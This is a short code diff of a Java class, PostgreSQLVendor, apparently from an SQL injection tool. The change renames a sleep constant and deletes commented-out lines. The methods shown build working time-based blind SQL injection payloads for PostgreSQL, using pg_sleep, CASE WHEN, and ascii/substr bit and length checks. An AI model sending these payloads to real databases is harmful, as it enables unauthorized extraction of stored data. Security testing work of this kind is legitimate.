@@ -158,17 +158,17 @@ public class PostgreSQLVendor extends AbstractVendor {
 
     @Override
     public String getSqlTimeCheck(String check) {
-        return "+and+''=''||(select+CASE+WHEN+" + check + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+        return "+and+''=''||(select+CASE+WHEN+" + check + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
     public String getSqlTimeBitCheck(String inj, int indexCharacter, int bit) {
-        return "+and+''=''||(select+CASE+WHEN+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+        return "+and+''=''||(select+CASE+WHEN+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
     public String getSqlTimeLengthCheck(String inj, int indexCharacter) {
-        return "+and+''=''||(select+CASE+WHEN+char_length(" + inj + ")>" + indexCharacter + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+        return "+and+''=''||(select+CASE+WHEN+char_length(" + inj + ")>" + indexCharacter + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
@@ -184,7 +184,6 @@ public class PostgreSQLVendor extends AbstractVendor {
                     "substr(" +
                         "(" + sqlQuery + ")," +
                         startPosition + "," +
-//                        MediatorModel.model().blindStrategy.getPerformanceLength() +
                         Strategy.BLIND.getValue().getPerformanceLength() +
                     ")" +
                 "" +
@@ -201,7 +200,6 @@ public class PostgreSQLVendor extends AbstractVendor {
                         "substr(" +
                             "(" + sqlQuery + ")," +
                             startPosition + "," +
-//                            MediatorModel.model().timeStrategy.getPerformanceLength() +
                             Strategy.TIME.getValue().getPerformanceLength() +
                         ")" +
                     "" +
